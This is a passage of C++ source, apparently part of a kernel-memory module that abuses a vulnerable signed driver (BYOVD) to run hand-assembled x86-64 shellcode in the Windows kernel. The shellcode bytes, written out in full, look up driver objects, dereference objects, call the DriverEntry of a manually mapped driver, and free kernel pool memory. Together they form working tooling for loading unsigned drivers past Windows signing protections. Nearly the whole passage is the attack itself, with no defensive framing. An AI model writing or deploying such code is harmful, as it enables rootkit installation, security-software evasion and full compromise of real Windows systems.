        // Layout in scratch page:
        // base + 0x000: context (5 qwords)
        // base + 0x040: UNICODE_STRING (16 bytes)
        // base + 0x050: name buffer (wide chars)
        std::vector<uint8_t> ctx(0x100, 0);

        uint64_t unicodeVa = base + 0x40;
        uint64_t nameVa = base + 0x50;

        uint64_t* q = reinterpret_cast<uint64_t*>(ctx.data());
        q[0] = 0;            // result placeholder
        q[1] = obRef;
        q[2] = ioDriverType;
        q[3] = unicodeVa;
        q[4] = 0;            // objectOut placeholder

        UNICODE_STRING* us = reinterpret_cast<UNICODE_STRING*>(ctx.data() + 0x40);
        us->Length = static_cast<USHORT>(nameLenBytes);
        us->MaximumLength = static_cast<USHORT>(nameLenBytes + sizeof(wchar_t));
        us->Buffer = reinterpret_cast<PWSTR>(nameVa);

        std::memcpy(ctx.data() + 0x50, driverName, nameLenBytes);
        return ctx;
    };

    uint64_t result = 0;
    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
        std::cerr << "[hinv::kmem] GetDriverObject shellcode execution failed\n";
        return 0;
    }

    return result;
}

// ---------------------------------------------------------------------------
// Decrement reference count on a kernel object
// ---------------------------------------------------------------------------

bool DereferenceObject(byovd::IByovdBackend* backend, uint64_t objectAddress) {
    if (!backend || !objectAddress) return false;

    uint64_t obDeref = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObDereferenceObject");
    if (!obDeref) {
        std::cerr << "[hinv::kmem] ObDereferenceObject not found\n";
        return false;
    }

    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxBase)
    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    // movabs rdx, 0
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    // push rbx
    sc.insert(sc.end(), { 0x53 });
    // mov rbx, rcx
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    // mov rcx, [rbx]        ; object address
    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
    // mov rax, [rbx+0x08]   ; ObDereferenceObject
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    // sub rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    // call rax
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    // add rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    // pop rbx
    sc.insert(sc.end(), { 0x5B });
    // ret
    sc.push_back(0xC3);

    ContextBuilder buildCtx = [objectAddress, obDeref](uint64_t base) {
        uint64_t data[2] = { objectAddress, obDeref };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
}

// ---------------------------------------------------------------------------
// Call a manually mapped driver's DriverEntry from Ring 0
// ---------------------------------------------------------------------------

uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa) {
    if (!backend || !driverEntryVa || !driverObjectVa) return STATUS_INVALID_PARAMETER;

    std::vector<uint8_t> sc;
    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxBase)
    Emit({ 0x48, 0xB9 }); PushU64(0);
    // movabs rdx, 0
    Emit({ 0x48, 0xBA }); PushU64(0);

    // push rbx
    Emit({ 0x53 });
    // mov rbx, rcx
    Emit({ 0x48, 0x89, 0xCB });

    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08] (DriverEntry)
    Emit({ 0x49, 0x89, 0xC2 });             // mov r10, rax
    Emit({ 0x48, 0x8B, 0x53, 0x18 });       // mov rdx, [rbx+0x18] (RegistryPath)
    Emit({ 0x48, 0x8B, 0x4B, 0x10 });       // mov rcx, [rbx+0x10] (DriverObject)
    // sub rsp, 0x28                        ; shadow space
    Emit({ 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    Emit({ 0x41, 0xFF, 0xD2 });             // call r10
    // add rsp, 0x28
    Emit({ 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    Emit({ 0x89, 0x03 });                   // mov [rbx], eax (store NTSTATUS at ctx[0])

    // pop rbx
    Emit({ 0x5B });
    // ret
    Emit({ 0xC3 });

    ContextBuilder buildCtx = [driverEntryVa, driverObjectVa, registryPathVa](uint64_t base) {
        uint64_t data[4] = { 0, driverEntryVa, driverObjectVa, registryPathVa };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    uint64_t result = 0;
    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
        std::cerr << "[hinv::kmem] CallDriverEntry shellcode execution failed\n";
        return STATUS_UNSUCCESSFUL;
    }

    return static_cast<uint32_t>(result);
}

// ---------------------------------------------------------------------------
// Free kernel memory via ExFreePoolWithTag
// ---------------------------------------------------------------------------

bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
    if (!backend || !kernelVa) return false;

    uint64_t freeFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePoolWithTag");
    if (!freeFn) {
        std::cerr << "[hinv::kmem] ExFreePoolWithTag not found\n";
        return false;
    }

    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxBase)
    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    // movabs rdx, 0
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    // push rbx
    sc.insert(sc.end(), { 0x53 });
    // mov rbx, rcx
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    // mov rcx, [rbx]        ; address to free
    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
    // mov edx, 'hinv'       ; tag
    sc.insert(sc.end(), { 0xBA, 0x68, 0x69, 0x6E, 0x76 });
    // mov rax, [rbx+0x08]   ; ExFreePoolWithTag VA
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    // sub rsp, 0x28         ; shadow space
    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    // call rax
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    // add rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    // pop rbx
    sc.insert(sc.end(), { 0x5B });
    // ret
    sc.push_back(0xC3);

    ContextBuilder buildCtx = [kernelVa, freeFn](uint64_t base) {
        uint64_t data[2] = { kernelVa, freeFn };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
}

} // namespace kmem
} // namespace hinv
